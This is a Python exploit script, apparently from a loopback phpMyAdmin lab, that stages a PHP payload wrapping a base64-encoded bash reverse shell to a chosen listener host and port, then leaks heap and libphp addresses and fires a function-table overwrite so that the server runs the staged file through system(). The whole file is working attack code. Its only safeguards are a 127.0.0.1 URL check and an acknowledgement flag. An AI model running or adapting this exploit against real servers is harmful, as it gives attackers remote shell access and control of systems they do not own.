#!/usr/bin/env python3
"""Stage and fire a real reverse shell on the exact loopback phpMyAdmin lab."""
from __future__ import annotations

import argparse
import base64
import json
import time
import urllib.parse

import stock_phpmyadmin_deface as demo
import stock_phpmyadmin_gate as gate


def reverse_shell_payload(host: str, port: int) -> str:
    command = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
    encoded = base64.b64encode(command.encode()).decode()
    return f"<?php system(base64_decode('{encoded}'));?>"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", type=int, default=4461)
    parser.add_argument("--host-header", default="x")
    parser.add_argument("--blockers", type=int, default=148)
    parser.add_argument("--settle", type=float, default=10.0)
    parser.add_argument("--leak-tries", type=int, default=3)
    parser.add_argument("--fire-tries", type=int, default=1)
    parser.add_argument("--table-off", type=lambda value: int(value, 0), default=0x690D8)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--ack-exact-profile", action="store_true")
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port is None:
        raise ValueError("this demo requires an explicit http://127.0.0.1:<port> URL")
    if not args.ack_exact_profile:
        raise ValueError("refusing hard-coded offsets without --ack-exact-profile")
    if not (1 <= args.lport <= 65535):
        raise ValueError("invalid listener port")

    endpoint = gate.stock.Endpoint(args.url, args.timeout)
    endpoint.host_override = args.host_header
    endpoint.host_header = args.host_header
    blockers = gate.BlockerPool(parsed.hostname, parsed.port, args.blockers)
    staged = demo.StagedSession(
        parsed.hostname,
        parsed.port,
        args.host_header,
        reverse_shell_payload(args.lhost, args.lport),
    )
    result: dict[str, object] = {
        "target": args.url,
        "listener": f"{args.lhost}:{args.lport}",
        "requested_blockers": args.blockers,
        "staged_command": "php /tmp/s*",
    }

    try:
        connected = blockers.start()
        result["connected_blockers"] = connected
        if connected != args.blockers:
            result["status"] = "blocker_setup_failed"
            print(json.dumps(result, indent=2))
            return 1
        time.sleep(args.settle)
        print(f"[*] blockers alive {blockers.connected}/{args.blockers}", flush=True)

        staged.start()
        time.sleep(2.0)
        print(f"[*] reverse-shell payload staged for {args.lhost}:{args.lport}", flush=True)

        heap, module = gate.stock.Leak(endpoint, gate.ZVAL_PTR_DTOR, True).run(args.leak_tries)
        result["heap"] = hex(heap)
        result["libphp"] = hex(module)
        if not heap or not module:
            result["status"] = "leak_failed"
            print(json.dumps(result, indent=2))
            return 1

        fire = gate.stock.Fire(endpoint, gate.ZIF_SYSTEM, gate.ZVAL_PTR_DTOR, True)
        for attempt in range(1, args.fire_tries + 1):
            print(f"[*] firing callback attempt {attempt}/{args.fire_tries}", flush=True)
            fire.rotate()
            fire.run(
                heap,
                module,
                b"php /tmp/s*",
                table_offset=args.table_off,
                cookie="a" * 32,
                spray=15,
                live_n=0,
                live_len=31,
                fill_n=0,
                carrier_mode="adopted",
                progress_late=False,
                pads=gate.stock.parse_pads(""),
                decoy_n=2,
            )
            result["fire_attempts_sent"] = attempt

        result["status"] = "callback_fired_check_listener"
        result["blockers_alive_after_fire"] = blockers.connected
        print(json.dumps(result, indent=2))
        return 0
    finally:
        staged.close()
        blockers.close()


if __name__ == "__main__":
    raise SystemExit(main())
